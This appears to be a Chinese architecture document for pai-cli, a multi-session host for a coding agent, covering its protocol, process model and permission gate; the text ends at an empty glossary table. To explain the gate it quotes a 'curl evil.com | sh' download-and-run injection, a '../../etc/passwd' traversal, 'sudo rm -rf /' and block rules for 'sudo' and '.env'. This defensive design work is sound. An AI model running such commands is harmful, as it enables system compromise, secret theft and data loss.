# pai-cli 技术架构文档

这份文档讲清楚三件事：pai-cli 是什么、它内部怎么运转、以及为什么做成这个样子。读者不需要提前了解任何背景，我们从"一个编程助手是怎么工作的"讲起。

不同角色可以按需取用：

- **产品、老板**：读第 1、2、8、9 章，足够理解这个项目解决什么问题、代价是什么、和别的做法比好在哪。
- **产品经理**：建议加读第 3、5 章，了解 agent 的工作节奏和一次提问的完整旅程，对设计交互有帮助。
- **CTO / 架构评审**：全文，重点在第 4、7、8、10 章。
- **对接开发的同事**：第 4、6 章是上手路径，配合 [api.md](api.md)（对外接口明细）和 [design.md](design.md)（线协议规格）使用。

> 版本口径：本文描述 v0.5 形态（36 个命令、8 类输出帧）。协议细节的唯一真相是 `docs/design.md`，对外接口文档是 `docs/api.md`，本文不复制它们的全部内容，只在讲原理时引用关键部分。文中所有性能数字均注明来源：实测值来自 2026-09-07 darwin arm64 / bun 1.4.2 环境，标注"目标值"的是设计预算、未逐项实测。

## 1. 背景：coding agent 是怎么干活的

要理解 pai-cli，得先理解它托管的那个东西——**pi coding agent**。pi 是一个编程智能体（agent）：你用自然语言告诉它"帮我修一下这个测试"或者"把这个模块重命名"，它会真的去读代码、改文件、跑命令，干完了向你汇报。

它的工作方式是一个不断重复的循环：

```
        ┌──────────────────────────────────────────┐
        │                                          │
        ▼                                          │
  收到用户消息                                       │
        │                                          │
        ▼                                          │
  把对话历史发给大模型                                 │
        │                                          │
        ▼                                          │
  模流式地回复                                       │
   ├─ 纯文本 → 展示给用户，本轮结束 ────────────────────┘（结束）
   └─ 工具调用（"帮我执行 npm test"）
        │
        ▼
  权限门检查这次调用允不允许
        ├─ 不允许 → 拦下或弹窗问用户
        └─ 允许 → 真正执行（跑命令 / 读写文件）
              │
              ▼
        执行结果喂回模型，回到"发给大模型"这一步
```

有三点值得记住，后面到处会用到：

**第一，模型自己碰不到你的电脑。** 大模型能做的只是"提议"一次工具调用（跑一段 shell、改一个文件），真正动手的是 agent 程序，而动手之前会先过一道权限门。这是整个安全体系的地基：模型再怎么"想"执行 `sudo rm -rf /`，决定权在权限规则和用户手里。

**第二，回复是流式的。** 模型的输出一个词一个词地到达（你在 ChatGPT 里看到的打字机效果），agent 把每一次到达都包装成一个"事件"发出来：消息开始了、追加了一段文字、发起了一次工具调用、工具执行完了、这一轮彻底结束了。客户端消费这串事件流来渲染界面。

**第三，每一轮对话都落在一个会话文件里。** 你说过的每句话、模型每次回复、每次工具调用和结果，都按顺序追加写进一个 JSONL 文件（`~/.pi/agent/sessions/` 目录下，一个会话一个文件）。这带来两个能力：程序崩溃后可以从文件恢复现场接着聊；也可以从历史某一条消息处分叉出一条新的对话线（"回到你说错的那句话，换个方向再来"）。

### 那为什么有了 pi 还要再造一个 pai-cli

pi 是给一个人在一个终端窗口里用的。而我们要做的是一个桌面产品（Electron 应用）：用户会同时开好几个对话窗口，一边让 agent 修 bug、一边让它写文档，过一会儿可能又开第三个。直接拿 pi 来拼，会遇到三个绕不过去的问题：

1. **一个 pi 进程只服务一个会话。** 十个窗口就要自己拉起十个进程、管十条输入输出管道。
2. **没有统一的管家。** 登录凭据谁写？两个窗口打开了同一个会话文件怎么办（两个进程同时写一个文件，文件会损坏）？闲置的对话占着内存不还怎么办？这些问题每个窗口自己处理一遍，迟早打架。
3. **一损俱损的风险。** 如果为了省事把所有会话塞进一个进程（我们第一版就是这么做的），任何一个会话里的失控操作——一个死循环、一个吃内存的大任务——会把所有对话一起拖死。

pai-cli 就是来解决这三件事的：**它是 pi 的多会话宿主**，一个管家进程统一对外，底下每个活跃对话一个独立进程，互相之间烧不到对方。

## 2. pai-cli 是什么：一张大图

一句话定义：**pai-cli 是一个命令行程序（host 进程），它接受一套 JSONL 协议的指令（从 stdin 进入），为每个活跃对话管理一个 worker 子进程，把所有对话的实时事件统一打上标签后输出（从 stdout 流出）。图形客户端（Electron 或任何程序）spawn 它、给它喂命令、渲染它吐出的事件。**

```
 Electron 应用                     pai-cli host（1 个进程）              worker（每个活跃对话 1 个）
 ┌──────────────┐   stdin (JSONL)  ┌─────────────────────┐   管道 (JSONL)  ┌─────────────────┐
 │ 窗口 A: 修 bug │ ──────────────► │ 董事会/前台：          │ ─────────────► │ worker A: 对话 A  │
 │ 窗口 B: 写文档 │   命令 + id      │ · 命令路由            │   线程内命令    │  (pi 会话执行)    │
 │ 弹窗/确认框    │                 │ · 登录凭据、模型目录    │ ◄───────────── │ │
 │              │ ◄────────────── │ · 会话文件占用表        │   事件/心跳     │ worker B: 对话 B  │
 └──────────────┘  stdout (JSONL)  │ · worker 生杀与收编    │                │  (对话 B 独立进程) │
                   response/event/  └─────────────────────┘                │  …               │
                   心跳/死亡通知                       ▲                     └─────────────────┘
                                                      │ 管道 (JSONL)                │
                                                      ▼                            ▼
                                              孙 worker（子 agent，v0.5）   会话文件（每对话一个，
                                              对话 A 委派的临时任务进程      追加写，可恢复/分叉）
```

打个比方：host 是餐厅前台，worker 是每桌一个的独立操作间。前台接单、派单、记账、管钥匙；每间操作间独立供电独立排风，一间失火不会烧到别间；一桌客人走空超过十五分钟，那间操作间断电省成本（会话现场已经记在账本上），客人回座随时来电继续。前台自己不炒菜——它只值 100 多 MB 内存，再多的活都不该让它干。

职责划分遵循一条铁律：**每件事只有一个实现点**（代码里叫"单一真相"）。谁负责什么，看这张表：

| 事实                            | 归谁管                             |
| ------------------------------- | ---------------------------------- |
| 有哪些对话、各自什么状态        | host 的路由表（thread-table）      |
| provider+modelId 解析成模型对象 | host（worker 不解析）              |
| 登录凭据 auth.json 的写入       | host（worker 只读）                |
| 会话的执行（对话、工具、分叉）  | worker（每个 worker 恰好一个会话） |
| 某对话闲置了多久                | worker 心跳上报（host 不瞎猜）     |
| 一次工具调用允不允许            | worker 内的权限判定 `decide()`     |
| 协议类型定义                    | `src/protocol.ts`（全项目唯一）    |

这条铁律的收益很实际：出问题时排查路径是确定的，改行为时不会出现两处实现打架。

顺带交代下演进史，方便理解为什么长这样：v0.1 定下线协议（命令/响应/事件的基本契约），v0.2 加了登录凭据命令，v0.3 加了会话树/分叉/直执行 bash，v0.4 把"单进程多会话"重构成"每对话一个进程"（动机见第 8 章，旧实现留在 `pai-inprocess` 分支供对比），v0.5 加了子 agent、后台任务和按对话独立的权限规则。每次演进都是对外协议纯增量，对接方不需要推倒重来。

## 3. Agent 执行逻辑：一个对话内部发生的事

这一章讲 worker 进程里那个会话的运转方式。产品同事读这章能对上交互设计的颗粒度。

### 3.1 一轮对话的解剖

用户发来一条消息（`prompt` 命令），worker 里的 pi 会话开始一轮：

1. 消息连同历史一起发给模型；
2. 模型流式回复，事件一个接一个流出：`message_start`（一条消息开始）→ 一串 `message_update`（文字增量 / 思考过程 / 发起工具调用）→ `message_end`（这条消息的权威最终版）；
3. 如果模型提议了工具调用（比如执行 `npm test`），先过权限门（见 3.2），然后真实执行，进度经 `tool_execution_start/update/end` 事件流出；
4. 巧行的结果喂回模型，模型决定接着干还是收工；
5. 彻底结束时发出 `agent_settled`——这是客户端"输入框重新可用"的信号。

理解 `message_update` 的一个关键设计：**帧里只有增量，没有累积快照**。也就是说每个增量帧的大小是恒定的，不随会话变长而变大。客户端自己把文字增量拼起来，以 `message_end.message` 为最终权威。为什么这么设计？如果不剥离快照，一个聊了几千轮的长会话，每个增量帧都要背上全量历史的体积，越到后面每秒流出的数据越大，纯属浪费。这是从 pi 的 RPC 语义继承来的决定。

### 3.2 权限门：模型提议，规则裁决

每次工具调用（bash 命令、写文件、改文件）都过同一道门，规则来自 `~/.pi/agent/permission-rules.json`（或按对话独立的 sidecar 文件，见 3.5）：

```json
{
  "mode": "ask",
  "bash": { "allowPatterns": ["git status", "npm run *"], "blockPatterns": ["sudo *"] },
  "write": { "allowPatterns": ["/Users/me/proj/*"], "blockPatterns": ["*/.env"] },
  "edit": { "blockPatterns": ["*/.env*"] }
}
```

判定顺序（固定，写在 `src/rules.ts` 的 `decide()` 这一个函数里）：`mode` 为 `allow-all` 全放行 → `block-all` 全拦 → 命中黑名单拦 → 命中白名单放 → 剩下的弹窗问用户（`confirm` 对话框，5 分钟没人应答自动拒绝——agent 不会被一个没人看的弹窗卡死）。

几个容易被问到的问题：

**"允许 `make *`"会不会放行 `make x; curl evil.com | sh`？** 不会。组合命令会按 `;` `&&` `||` `|` 等分隔符拆段，**每一段都必须各自命中白名单**；出现反引号、`$()`、重定向这类替换/重定向语法，直接降级为弹窗。所以"允许 `echo *` + 允许 `sleep *`"会放行 `echo a && sleep 1`，但任何拼接出来的下载执行都过不去。

**模型写个 `../../etc/passwd` 能绕过目录白名单吗？** 不能。write/edit 匹配的不是模型给的原始字符串，而是**解析后的绝对路径**（先按会话目录归一化，再收缩符号链接到实际存在的目录）。匹配的是"实际会写到哪"，不是"模型嘴上说写哪"。

**改了规则要重启吗？** 不用。每次工具调用都重新读一遍规则文件，设置界面改完即生效，没有内存缓存，也就没有缓存失效问题。文件坏了也不崩，自动降级成"事事都问"。

### 3.3 打断与插话：steer 和 follow_up

模型正在流式干活时，用户又发话了怎么办？两种选择，客户端必须二选一显式声明：

- **steer（转向）**：在模型当前工具调用执行完、下次调用模型之前插进去，相当于"等等，方向改一下"；
- **follow_up（追问）**：排到本轮彻底结束后再投递，相当于"忙完你的再看这个"。

正在流式中不带声明的裸 `prompt` 会被拒绝——这是有意的：让客户端显式选择语义，而不是宿主替用户猜。键盘上的 Esc 键语义就是"清空排队消息 + 中止当前轮"（`clear_queue` + `abort`）。

### 3.4 会话文件：账本、树、分叉

会话文件是追加写的 JSONL，每条记录叫一个 entry（带持久 id）。历史不只是一条直线，而是一棵**追加树**：从任意一条历史消息处分叉（`fork`），就长出一个新分支。三个相关命令：

- `fork`：从历史某条目分叉出新对话（`before` = 从那条之前重来，`at` = 连它一起复制）；
- `clone`：在当前位置原样复制一份（试试另一个方向而不毁掉现在这版）；
- `navigate_tree`：在同一棵树里跳到别的分支（不换文件）。

有个对客户端很重要的细节：**fork/clone 之后 threadId 会换新**（因为底层换了一个新会话文件），旧 id 立即失效。响应里带 `previousThreadId`，客户端要把窗口路由到新 id。host 会在把响应转发出去**之前**先完成自己路由表的重键——保证客户端收到响应后立刻用新 id 发命令时，表已经就绪。这个"先后顺序"有单元测试锁着。

### 3.5 子 agent 与后台任务（v0.5）

主对话里的模型可以把活派出去：它有一个 `task` 工具，按 agent 定义（`.md` 文件，描述某类角色的职责）委派任务。实现上，每个任务起一个**临时孙进程**（worker 的子进程），跑完即焚、会话不落盘、上下文窗口与主对话完全隔离。这样设计的原因很直接：派出去的调研、批量改动这类活，不该撑爆主对话的上下文；干完只把结论带回来。

两种用法：

- **前台**：`task` 阻塞等结果，干完继续主线；
- **后台**：`background:true` 立刻拿到回执继续干别的，任务完成后 pai 以**用户角色的消息**注入一条 `[task-notification]` 通知，唤醒主对话处理结果。注意这意味着通知会自动触发一个模型回合，有 token 成本——是模型自己选的 `background:true`，等于它接受了这个账单。

防护栏（预算写死在代码里，防止模型失控自我复制）：单次调用最多派 8 个任务；每个对话同时运行的孙进程最多 4 个、在飞最多 8 个、留存结果最多 16 个（旧的挤掉）；子 agent 深度只有 1——孙进程里没有 `task` 工具，不能再生孙孙进程。子 agent 的权限门**每次工具调用都热读主对话当前的规则**，主对话中途收紧权限，正在跑的后台任务立刻跟着收紧，没有"spawn 时拍的快照"这种漏洞。

通信是三条通道：客户端/模型可以给运行中的任务注入 steer（`subagent/steer` 命令 / `task_steer` 工具）；子 agent 可以 `report` 向上汇报（`subagent_message` 帧实时转发给客户端）；兄弟任务之间经主对话模型中介转发（路由智能在 lead，不搞独立路由引擎）。父进程从不上当于孙进程自报的身份，一律按自己的注册表重盖。

## 4. pai-cli 执行逻辑：host 与 worker 怎么配合

### 4.1 host 的日常

host 进程是客户端唯一对话的对象。它做的事可以数得出来：

- **解析协议**：从 stdin 逐行读 JSON（自研切割器，只按换行切、容忍 `\r`，单行上限 16 MiB，超限整行丢弃并回 parse failure——防一根巨型行把内存撑爆）；
- **路由命令**：按 threadId 查表，把线程内的命令原样（原 id）转发给对应 worker；`get_models`、`thread/list`、`auth/*` 这类全局命令它自己就地应答，**绝不为此唤醒一个闲置 worker**；
- **转发事件**：worker 吐出的每个事件帧，打上 threadId 透传给客户端。大帧（比如几十 MB 的 `get_messages` 响应）不做完整解析，只按行首前缀提取 id 和 command 两个字段就转发——host 的转发路径被要求 **<1ms 且零磁盘 IO**，不能因为一帧大payload卡住所有对话；
- **管进程**：worker 的生（spawn）、杀（崩溃/心跳陈旧）、收编（闲置退休）、唤醒（respawn+resume）；
- **管钥匙**：auth.json 只有 host 写；模型解析只在 host 做（这样 host 自己登录后能立刻用上新凭据，不用等各 worker 各自刷新）。

### 4.2 worker 的日常

worker 进程里就是那个对话本身：一个 pi 会话 + 权限门 + 心跳。它每秒向 host 汇报一次心跳：闲置了多久、是否在流式中、会话文件路径。闲置计时的规则有个贴心的细节：`get_state`、`get_messages` 这类**只看不改**的命令不重置闲置计时——客户端轮询状态不会阻止一个对话被回收。

host 自己也每秒向客户端发一帧心跳。**超过 10 秒没有心跳 = host 卡死**，客户端的处置是杀掉重启、按注册表逐个 `thread/resume` 恢复会话。两层心跳把"谁还活着"变成一个随时可测的事实，而不是靠猜。

### 4.3 线程生命周期：一张状态机

```
 spawning ──start/resume 成功──► live ──闲置≥15分钟──► retiring ──排空退出──► parked
    │                             │                                            │
    │ 启动失败/超时                 │ 崩溃/心跳陈旧(>30s)被杀                        │ 任意线程命令
    ▼                             ▼                                            ▼
  回收（撤占位）                dead ──发 thread_died 帧──┐              spawning（respawn+resume）
                                    下条命令自动复活 ◄──────┘──────────────────┘
 live/parked/dead ──thread/stop──► 条目删除（live 走优雅退出，会话文件保留）
```

每个状态的含义：

- **live**：有 worker 进程在跑。默认上限 32 个活跃对话（`PAI_MAX_THREADS`）。
- **parked（停摆省电）**：闲置满 15 分钟的对话，worker 优雅退出、会话文件已落盘，**常驻内存归零**。条目还在表里，下一条命令自动唤醒（重新 spawn + resume），对客户端透明。
- **dead（出事躺平）**：worker 异常死亡（崩溃、心跳陈旧被强杀、fork 半路失败自退）。host 恰好发一次 `thread_died {threadId, reason}`，条目标记 dead。下一条命令自动复活。

三个关键语义，每一个都对应真实踩过的坑：

**终止判定一律以 stdout close 为准，而不是进程 exit 事件。** 原因：进程 exit 事件可能先于管道里残留数据的派发，先按 exit 结账会丢最后几帧。close（数据排空）之后 host 才做状态迁移，并对这个 worker 的所有未响应命令按 id 对账：已经收到响应的不补，没收到响应的合成一个 failure——保证客户端那边"每个命令恰好一个响应"永远成立，不会因为 worker 死了而吊着一个永远不回来的 id。

**孤儿自灭。** worker 的 stdin 就是 host 的管道。host 死了（哪怕被 SIGKILL），管道写端关闭，worker 的 stdin 立刻收到 EOF，走优雅退出（中止在途操作、落盘会话、退出）。不需要任何"检测父亲还活着"的代码，管道就是生命线。

**宁可杀错。** 心跳陈旧 30 秒的 worker 会被强杀（先礼后兵：SIGTERM 给 2 秒，再 SIGKILL）。这意味着同步执行超过 30 秒的 worker 会被误杀——记录在案的取舍。理由：心跳区分不了"忙"和"死"，而在旧架构里一个冻结的对话冻结的是全部对话；新架构里杀错的代价只是这一个对话走一遍自动复活。天平明显偏向后者。

### 4.4 会话文件的单写者保护

一个会话文件同一时刻至多一个写者，否则文件损坏。host 维护一张占用表，**发起 spawn 时就占位**（不等启动完成，消灭竞态窗口）。对已占用路径的 `thread/resume` 直接失败，错误文案里写明原因。这不是多虑：用户在两个窗口打开同一个历史会话，是产品形态里一定会发生的操作。

### 4.5 stdout 单通道纪律

stdout 是唯一协议通道，所以必须保证它干净。问题是：pi SDK 和第三方扩展里随处可见 `console.log`，任何一条漏到 stdout 都会把协议流弄脏。解法是启动时**接管两层**（`process.stdout.write` 和 `console.*`），让杂散日志改道 stderr；协议帧只走接管时抓到的原始句柄，且经全局串行队列写入——任意两帧绝不交错。管道满了（ENOBUFS）就等 10ms 重试，因为那是暂态；管道断了（EPIPE，客户端死了）就走优雅退出，因为那是终态。

## 5. 数据流转：一次提问的完整旅程

把前面所有环节串起来。用户在 Electron 窗口 A 输入"跑一下测试"，回车：

```
 Electron                host                        worker A                pi 会话 / 模型
    │                     │                             │                       │
    │ prompt{id:2,...} ──►│ 查表：t1 → worker A          │                       │
    │                     │──原 id 转发──────────────────►│ 权限/形状校验           │
    │                     │                             │──prompt()────────────►│
    │◄─ response{id:2} ───│◄────"已接受"─────────────────│                       │
    │   （注意：此刻模型还没开始跑，response 只表示收下了）  │                       │
    │                     │                             │◄────流式事件───────────│
    │                     │                             │  message_start        │
    │◄─ event{text_delta}─│◄──打 threadId 透传───────────│  text_delta × N       │
    │◄─ event{...} ×N     │                             │  toolcall(bash)       │
    │                     │                             │   └ 权限门：npm test   │
    │◄─ ui_request{r1} ───│◄──confirm"npm test？"────────│      命中白名单→放行    │
    │  （弹窗）             │                             │      未命中→弹窗        │
    │ ui_response{r1} ───►│ 恒定 ack + 广播给 live worker │                       │
    │                     │                             │──执行 bash─────────────│
    │◄─ event{tool_*} ────│◄────────────────────────────│  结果喂回模型            │
    │◄─ event{message_end}│                             │                       │
    │◄─ event{agent_settled}                            │                       │
    │  （输入框解锁）        │                             │                       │
```

几个节点值得单独点出来：

- **`prompt` 的 response 是"已接受"不是"已完成"**。模型跑完一轮可能要几十秒，协议不能让一个 response 等它——所以接受即应答，后续内容全部走事件流。与之对照，`bash` 直执行命令的 response 就是执行完毕才返回（可能分钟级），客户端要按长超时设计。
- **ui_response 的广播设计**。requestId 是 worker 自己生成的 UUID，host 不维护"哪个弹窗归哪个 worker"的表——一律恒定 ack 一次，然后广播给所有 live worker，无关的 worker 解析后自然忽略。host 不持有弹窗状态，就没有状态泄漏面，也没有清理逻辑。
- **行尺寸的三个数字**：客户端→host 单行 16 MiB；host→worker 16 MiB；worker→host 128 MiB（`get_messages` 的单行响应确实能到几十 MB，worker 是自家进程可信，放行；客户端侧坚持小帧 + 分页）。
- **会话文件异步落在一旁**：对话的每条 entry 追加写进会话文件，它是崩溃恢复和闲置收编的底气——任何进程死掉，现场都在盘上。

## 6. 怎么用

### 6.1 跑起来

```bash
# 仓库内直接跑（bun 运行 TS，无需构建）
bun src/cli.ts

# 不带 UI 的最小调试：一行命令进去，看协议出来
echo '{"id":"1","type":"thread/start","cwd":"/tmp"}' | bun src/cli.ts

# 构建与打包
npm run build     # → dist/cli.js（bun bundle）
```

跑 `prompt` 前需要模型凭据：交互式跑一次 `pi` 命令走 `/login`，或用协议命令 `auth/set_api_key` 注入 API key（key 只从 stdin 进，保证不出现在任何输出帧和日志里）。

### 6.2 一个最小会话长什么样

```jsonc
// → 发：开一个对话（cwd 决定 agent 工作在哪个项目）
{"id":"1","type":"thread/start","cwd":"/proj","provider":"glm","modelId":"glm-5.3-flash"}
// ← 收：{"id":"1","type":"response","command":"thread/start","success":true,
//        "data":{"threadId":"t1","sessionPath":"..."}}

// → 发：让 agent 干活
{"id":"2","type":"prompt","threadId":"t1","message":"跑一下测试"}
// ← 收：response{id:2}（已接受）+ 一串 event 帧（流式文本、工具进度）……
// ← 收：ui_request（权限确认弹窗）→ 用 ui_response{requestId, confirmed} 应答
// ← 收：event{agent_settled}（本轮完成）

// → 发：增量拉历史渲染界面（entry id 持久，跨重启有效）
{"id":"3","type":"get_entries","threadId":"t1","since":"<上次见到的最后 entry id>"}
```

36 个命令按组分布：线程生命周期 5 个、对话驱动 6 个、状态与历史 8 个、会话树/分叉 3 个、模型 4 个、凭据 3 个、直执行 bash 2 个、对话框应答 1 个、子 agent 通信 1 个、按对话权限 2 个、agent 枚举 1 个。每个命令的字段、错误语义、注意事项在 [api.md](api.md) 里有完整明细，这里不重复。

### 6.3 Electron 对接的既定约定

- spawn 时用 `PI_CODING_AGENT_DIR` 把配置目录指到应用的 userData 下（auth/模型/会话/权限规则全在一起，天然做到应用间隔离）；自定义 provider 的 key 经 env 引用注入（models.json 里写 `"$GLM_API_KEY"`）。
- **心跳监督是客户端的责任**：>10 秒无心跳 → 杀 host → 重启 → 按自己登记的 `sessionPath` 逐个 `thread/resume`。会话文件是耐久的，这一套恢复流程是产品韧性的最后一道闸。
- 轮询用 `thread/list`（host 本地应答，不吵醒 worker），不要对 parked 线程反复 `get_state`（那会触发唤醒风暴）。
- 权限确认弹窗**永远要回** `ui_response`（用户关掉弹窗就回 `cancelled:true`）——5 分钟不回会自动拒绝，agent 不会被卡住，但用户会错过表态机会。
- fork/clone 响应到达后立刻把窗口切到新 threadId，旧 id 已失效。

### 6.4 可调的环境旋钮

| 旋钮                         | 默认   | 含义                       |
| ---------------------------- | ------ | -------------------------- |
| `PAI_MAX_THREADS`            | 32     | live 对话上限              |
| `PAI_IDLE_RETIRE_MS`         | 900000 | 闲置收编阈值（15 分钟）    |

### 6.5 怎么验证它没坏

这套项目的质量门是层层设防的：`npm run ci` 一键跑完 lint（0 警告 0 错误才算过）、格式检查、TypeScript 严格模式类型检查、构建、单元测试和契约级冒烟（真实 spawn host 进程、逐命令断言 happy/error 路径）。在此之上有三道真实 LLM 的端到端门（opt-in，需要配 key）：全接口旅程 + worker 韧性（主动 kill/retire/孤儿化进程）、4 线程并发产物验证（数据不串、设置隔离、杀一个其余存活、进程树内存采样）、单文件编译形态冒烟。此外每个版本定稿前有独立会话的**对抗审查**环节（假设代码有错地挑刺），历史发现的问题及处置全部记录在设计文档里。对关心工程文化的同事：这套流程本身是架构的一部分——"恰好一个响应"这类承诺之所以敢写进文档，是因为有契约级测试锁着。

## 7. 为什么这么设计：逐条讲理由

这一章把散落在各节的设计决策集中摊开。评价架构不能只看它像什么，要看它**放弃了什么**。

**为什么每个对话一个进程，而不是一个进程多个会话？** 我们第一版就是单进程多会话，实测教训写在迁移文档里：所有对话共享一个事件循环和一个 V8 堆（约 4GB 上限），任何对话里的同步长操作冻结**全部**对话，一个重对话 OOM 连坐全场，trusted 扩展是任意代码、影响面也是全场。图形产品的底线是"一个窗口出事不能连累别的窗口"，进程是操作系统提供的最硬的隔离边界，没有之一。

**为什么是多进程而不是多线程？** 线程池（worker_threads）看起来更省内存，但隔离是软的：一个 native 扩展的段错误、一次进程级 OOM、一次 stdout 争抢，照样全军覆没；而且信号处理和 stdio 接管在多线程下要重新论证一遍。既然要隔离，就隔离到底。

**为什么 stdio 上的 JSONL，而不是本地起 HTTP/WebSocket 服务？** stdio 管道是 spawn 自带的：不占端口、没有端口冲突、不需要令牌鉴权（管道本身就是"谁 spawn 我谁有资格"的凭证）、不会触发防火墙弹窗、生命周期与父进程天然绑定（父进程死 → EOF → 自动优雅退出）。HTTP 能给的跨机器能力，桌面产品用不上；HTTP 带来的端口/令牌/服务生命周期管理，桌面产品一样都不想接。

**为什么"每个带 id 的命令恰好一个响应"是铁律？** 客户端要维护一张"发出去还没回来"的表（pending 表），恰好一响应让这张表可以精确核销、永不泄漏。听起来朴素，做起来处处是坑：worker 死了要给未响应的合成 failure；`prompt` 要在"接受时刻"就应答而不是等模型跑完；fork 失败要区分"线程还在"和"线程死了"两种失败。把这条契约焊死，客户端的状态机才能简单。

**为什么事件帧剥离累积快照？** 见 3.1——长会话里每秒流出的数据量不应随会话长度增长。帧大小恒定，转发和渲染的成本都可预测。

**为什么权限规则每次调用热读，而不是启动时加载进内存？** 设置界面改规则文件要立刻生效，热读让"文件即真相"，没有缓存就没有失效问题；坏文件降级到最保守的"事事都问"，永不抛错。子 agent 也热读主对话的规则，收紧即时传导。

**为什么孙进程即焚（ephemeral）、深度只有 1？** 委派任务的目的是隔离上下文，不是组建大军。深度 1 + 预算上限（并发/在飞/留存）把"模型自我复制失控"这条科幻恐慌路线在机制上焊死；不落盘则是因为派生任务的中间过程没有恢复价值，结论带回来就够了。

**为什么心跳 30 秒宁可杀错？** 见 4.3。隔离改变了代价函数：杀错一个对话的代价从"全场冻结"降到"一个对话自动复活几十秒"，天平自然倒向果断。

**为什么 fork/clone 要换 threadId？** threadId 恒等于当前会话文件的 id，分叉生成了新文件，id 就该换。让"id 即文件"保持恒等，比搞一套 id 到文件的间接映射更不容易出错——代价是客户端要多做一步重路由，协议用 `previousThreadId` 把这步变得机械化。

## 8. 和其他方案比一比

做桌面端多会话 agent 产品，可选的形态就这么几种。逐个过，包括我们自己走过又放弃的。

**方案 A：单进程多会话**（旧 pai-inprocess，我们的 v0.1–v0.3 形态）。所有对话住一个进程。优点是省内存（实测单进程 idle 116MB）、没有进程间通信、代码简单。致命伤在第 7 章说透了：一个对话死循环全场冻结、一个对话 OOM 全场连坐。对单用户的 CLI 工具这是可接受的概率问题，对多窗口的桌面产品这是不可接受的架构缺陷。

**方案 B：一个进程 + 线程池**。省内存程度接近 A，隔离比 A 好一点（每个线程有自己的事件循环）。但进程级故障（native 崩溃、整进程 OOM、stdout 争抢）依然连坐，隔离不彻底等于没隔离。

**方案 C：客户端直接内嵌 SDK**（Electron 主进程里 import agent 库）。对接最省事，函数调用即可。但 agent 的稳定性直接变成应用的稳定性：agent 死循环 = 界面死循环，agent OOM = 应用 OOM，agent 升级 = 应用发版。桌面应用的主进程是最不该冒险的地方。

**方案 D：每个窗口自己 spawn 一个 agent 进程，不设宿主**（pi 现成的 RPC 模式就能这么拼）。隔离性有了，但回到第 1 章的三个痛点：没有统一的凭据写点（N 个进程并发读写 auth.json）、没有会话文件占用表（两个窗口双开同一会话把文件写坏）、没有闲置回收（N 个进程常驻）、没有统一的对客户端管道（要自己做多路事件复用）。pai-cli 本质上就是方案 D 再加一个薄薄的 host 把这些"必须有唯一归属"的职责收拢——所以真正的对比是"D + 各窗口自理"对"D + 统一宿主"。

**方案 E：本地 HTTP/WebSocket 服务**。跨语言对接友好（任何语言都能发 HTTP），适合"agent 服务被多个独立应用消费"的场景。代价是端口管理、本机令牌鉴权、防火墙弹窗、服务自身谁拉起谁监督的问题——stdio 方案里这些问题全部不存在，因为管道继承自 spawn。桌面产品自己消费自己的 agent，用不上跨语言的灵活性。

**方案 F：云端 agent 服务**。凭据集中在服务端、任意设备可用、算力弹性。但这个产品的场景是**改用户本地磁盘上的代码仓库**——要么把仓库搬到云沙箱（改变用户工作方式），要么云端模型驱动本地执行器（复杂度爆炸），再加数据出域、离线不可用、延迟。对"桌面端本地代码助手"这个定位，执行必须在本地，云端方案不是竞争对手而是另一个产品。

汇总成一张表（内存为 4 并发对话场景的量级对比）：

| 方案                       | 故障隔离   | 内存代价           | 对接复杂度         | 关键短板               |
| -------------------------- | ---------- | ------------------ | ------------------ | ---------------------- |
| A 单进程多会话             | 无         | 最低（~116MB）     | 低                 | 一坏全坏               |
| B 进程+线程池              | 软         | 低                 | 低                 | 进程级故障仍连坐       |
| C 客户端内嵌 SDK           | 无         | 最低               | 最低               | agent 崩溃即应用崩溃   |
| D 每窗口独立进程           | 进程级     | 中                 | 中（N 条管道自理） | 凭据/占用/回收无人统管 |
| E 本地 HTTP 服务           | 进程级     | 中                 | 中                 | 端口/令牌/服务生命周期 |
| F 云端服务                 | 强         | （不占本地）       | 中                 | 本地仓库场景不成立     |
| **pai-cli（host+worker）** | **进程级** | 中高（见下节实测） | 低（1 条管道）     | 内存与冷启动的代价     |

选型建议一句话：给自己用做个 CLI，pi 本体就够；做 Web 产品配云端沙箱，走 F；做桌面产品操作本地仓库，就是 pai-cli 这个形态——这也是 ZCode 等同类产品收敛出的同一条路。

## 9. 优点与代价：把账摊开算

### 优点

**可靠性是设计出来的，不是祈祷出来的。** 故障域按对话切开：一个对话崩溃/卡死/吃内存，其他对话无感；出事的对话收到一帧 `thread_died`，下条命令自动复活。心跳监督（两级：worker→host、host→客户端）让"卡死"在 10~30 秒内成为可观测事实。崩溃恢复的路（会话文件 + resume）是协议的一等公民，不是运维预案。

**内存曲线可控。** 闲置 15 分钟自动收编，parked 对话零常驻；活跃对话数有硬上限。实测（darwin arm64 / bun 1.4.2，4 并发对话）：host+全部 worker 进程树 idle 518MB、并发峰值 530MB。对照旧单进程基线 idle 116MB / 峰值 127MB——**隔离的价钱大约是每个对话 +110MB 常驻外加冷启动延迟**，买来的是互不连坐。设计预算里满配 32 对话约 3.5–4GB（目标值），真到那个规模的产品自然也付得起那个内存。

**契约严格，客户端好写。** 恰好一响应、事件按线程有序不交错、弹窗必有一次结算、错误统一英文中性文案、单条命令失败绝不弄死进程。对接方的心智负担被压到最低，`npm run ci` 里的契约冒烟测试逐命令锁着这些承诺。

**安全默认是收紧的。** 对话默认 `trusted:false`——项目 `.pi` 目录下的扩展是任意代码，不信任的项目一律不加载；权限门三态模式 + 黑白名单 + 组合命令逐段校验 + 路径归一化防逃逸 + 坏配置降级；API key 只从 stdin 进、全路径零回显；子 agent 预算焊死、深度 1、权限实时跟随主对话。

**对接零绑定。** 协议就是 stdio 上的 JSONL，任何能 spawn 子进程的语言都能接，不绑定 Electron、不绑定 Node。

### 代价与已知边界（诚实清单）

- **内存**：每个活跃对话约 +110MB 常驻（隔离的固有成本），32 满配约 3.5–4GB（目标值）。
- **冷启动**：新建/唤醒对话要 spawn 一个进程（设计目标 P50 ≤ 2s），parked 唤醒有一拍延迟。
- **30 秒杀线**：同步执行超 30 秒的 worker 会被当死强杀（自动复活兜底）——这是"宁可杀错"的既定取舍，同步超长任务属于已知边界。
- **登录界面不在范围内**：`pi` 命令交互式登录一次，或走 `auth/set_api_key`；多步交互式 OAuth 登录流是后续版本的事。
- **单机限定**：stdio 管道决定客户端必须在同机 spawn；跨机器场景请回到第 8 章选型。
- **Windows 的打包细节**（NTFS 权限语义等）归属打包阶段处理；Bun 下第三方代码的 `console.log` 理论上存在绕过接管的快速路径（协议帧本身不受影响，README 已声明）。
- **图片输入**（prompt 带 images）透传但未充分测试。

## 10. 术语表

| 术语          | 含义                                                                   |
